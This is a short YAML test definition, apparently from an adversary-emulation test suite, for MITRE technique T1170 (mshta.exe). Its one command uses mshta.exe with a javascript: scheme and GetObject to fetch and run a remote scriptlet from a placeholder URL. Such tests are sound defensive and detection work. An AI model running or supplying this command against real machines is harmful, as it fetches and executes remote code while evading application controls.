attack_technique: T1170
display_name: Mshta.exe is a utility that executes Microsoft HTML Applications (HTA).
atomic_tests:
- name: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
  description: |
    Test execution of a remote script using mshta.exe
  supported_platforms:
    - windows
  input_arguments:
    file_url:
      description: location of the payload
      type: Url
      default: https://www.example.com/mshta.sct
  executor:
    name: command_prompt
    command: |
      mshta.exe javascript:a=GetObject("script:#{file_url}").Exec();close();
